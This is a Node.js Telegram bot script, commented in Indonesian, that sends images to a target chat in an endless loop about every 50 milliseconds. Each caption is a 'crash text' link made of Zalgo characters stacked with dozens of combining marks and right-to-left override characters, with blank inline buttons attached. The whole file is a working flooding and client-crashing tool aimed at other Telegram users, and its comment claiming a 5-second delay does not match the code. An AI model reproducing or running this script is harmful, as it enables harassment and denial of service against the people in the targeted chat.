require('dotenv').config(); // Memuat variabel dari .env
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const ora = require('ora');

// Konfigurasi token bot dan chat ID dari .env
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// Path folder gambar
const folderPath = './images';

// Fungsi untuk membuat teks Zalgo
const zalgo = (text) => {
  const zalgoUp = ['̍', '̎', '̄', '̅', '̿', '̑', '̆', '̐', '͒', '͗', '͑', '̇', '̈', '̊', '͂', '̓', '̈', '͊', '͋', '͌', '̃', '̂', '̌', '͐', '̀', '́', '̋', '̏', '̒', '̓', '̔', '̽', '̉', 'ͣ', 'ͤ', 'ͥ', 'ͦ', 'ͧ', 'ͨ', 'ͩ', 'ͪ', 'ͫ', 'ͬ', 'ͭ', 'ͮ', 'ͯ', '̾', '͛', '͆', '̚'];
  const zalgoDown = ['̖', '̗', '̘', '̙', '̜', '̝', '̞', '̟', '̠', '̤', '̥', '̦', '̩', '̪', '̫', '̬', '̭', '̮', '̯', '̰', '̱', '̲', '̳', '̹', '̺', '̻', '̼', 'ͅ', '͇', '͈', '͉', '͍', '͎', '͓', '͔', '͕', '͖', '͙', '͚', '̣'];
  const zalgoMid = ['̕', '̛', '̀', '́', '͘', '̡', '̢', '̧', '̨', '̴', '̵', '̶', '͜', '͝', '͞', '͟', '͠', '͢', '̸', '̷', '͡', '҉'];

  const randomChar = (arr) => arr[Math.floor(Math.random() * arr.length)];
  let zalgoText = '';

  for (let char of text) {
    zalgoText += char;

    for (let i = 0; i < 10; i++) {
      zalgoText += randomChar(zalgoUp);
      zalgoText += randomChar(zalgoMid);
      zalgoText += randomChar(zalgoDown);
    }
  }

  return zalgoText;
};

// Teks Zalgo dengan efek seperti link
const crashText = `[${zalgo('            ‮‮‮🤡   ')}](${zalgo('https://               .com')})`;

// Inline Keyboard (Button)
const inlineKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [{ text: '               ', callback_data: 'https://               .com' }],
      [{ text: '               ', callback_data: '               ' }],
    ],
  },
};

let successCount = 0;
let failureCount = 0;

// Fungsi untuk memilih file secara acak
const getRandomFile = (files) => {
  return files[Math.floor(Math.random() * files.length)];
};

// Fungsi utama untuk mengirim gambar dengan teks crash
const sendImagesWithCrashText = async () => {
  try {
    const files = fs.readdirSync(folderPath).filter((file) =>
      /\.(jpg|jpeg|png|gif)$/i.test(file)
    );

    if (files.length === 0) {
      console.log(chalk.yellow('⚠️ Tidak ada file gambar di folder. Menunggu gambar ditambahkan...'));
      return;
    }

    const spinner = ora(chalk.blue('🚀 Mengirim gambar...')).start();
    const fileName = getRandomFile(files);
    const filePath = path.join(folderPath, fileName);

    try {
      await bot.sendPhoto(CHAT_ID, filePath, {
        caption: crashText,
        parse_mode: 'MarkdownV2',
        ...inlineKeyboard,
      });
      successCount++;
      spinner.succeed(chalk.green(`✅ Berhasil mengirim: ${fileName}`));
    } catch (error) {
      failureCount++;
      spinner.fail(chalk.red(`❌ Gagal mengirim: ${fileName} - ${error.message}`));
    }
  } catch (error) {
    console.error(chalk.red('❗ Terjadi kesalahan:'), error);
  }
};

const main = async () => {
  console.log(chalk.cyan('🔥 Bot Pengiriman Gambar aktif! Tekan Ctrl+C untuk menghentikan.'));
  console.log(chalk.magenta(`🌟 Total berhasil: ${successCount} | ❌ Total gagal: ${failureCount}`));

  while (true) {
    await sendImagesWithCrashText();

    // Delay 5 detik sebelum iterasi berikutnya
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
};

main();
